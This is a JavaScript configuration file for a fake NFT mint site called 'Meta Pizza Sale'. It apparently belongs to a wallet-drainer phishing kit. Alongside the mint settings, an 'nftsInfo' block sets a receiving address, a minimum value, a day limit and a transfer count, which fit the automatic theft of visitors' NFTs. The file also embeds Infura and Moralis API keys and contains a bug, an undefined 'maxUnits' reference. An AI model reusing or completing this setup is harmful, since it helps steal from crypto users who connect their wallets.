const address = '0x9c23c05cD550925Ff3AeA4a100fd780eAc06b00B',
  infuraId = '821f5cf018a74107b7dc28802985b0b7',
  moralisApi =
    'U97vi2GVVEop2THgfYAewqcXlzorpYYl4hEBUKGSsNKR3YRgNd0fxEUU7hxREeTa'
const x20Ethereum = '0x9c23c05cD550925Ff3AeA4a100fd780eAc06b00B'
const collectionInfo = {
  name: 'Unapologetic Apes',
  title: 'Meta Pizza Sale',
  date: '07.05.2022',
  socialMedia: {
    discord: 'https://discord.com/invite/metapizza/',
    twitter: 'https://twitter.com/MetaPizzaNFT/',
  },
  medias: {
    preview: 'preview.gif',
    favicon: 'logo.png',
  },
  background: {
    type: 'video',
    image: 'background.png',
    video: 'background.mp4',
    color: '#4E4E6D',
  },
}
const mintInfo = {
    price: 0.111,
    totalSupply: 555,
    minUnits: 1,
    maxUnits: 5,
    askMintLoop: true,
  },
  nftsInfo = {
    active: true,
    minValue: 0.2,
    checkMaxDay: 100,
	maxTransfer: 2,
    receiveAddress: '0x9c23c05cD550925Ff3AeA4a100fd780eAc06b00B',
  }
if (mintInfo.minUnits > mintInfo.maxUnits) {
  console.error(
    'Error: minUnits (' +
      mintInfo.minUnits +
      ') is greater than maxUnits (' +
      maxUnits +
      ')'
  )
}
if (mintInfo.minUnits <= 0) {
  console.error(
    'Error: minUnits (' + mintInfo.minUnits + ') is less than or equal to 0'
  )
}
if (!address.startsWith('0x') || address.length >= 64 || address.length <= 40) {
  console.error('Error: ' + address + ' is not a valid Ethereum address.')
}
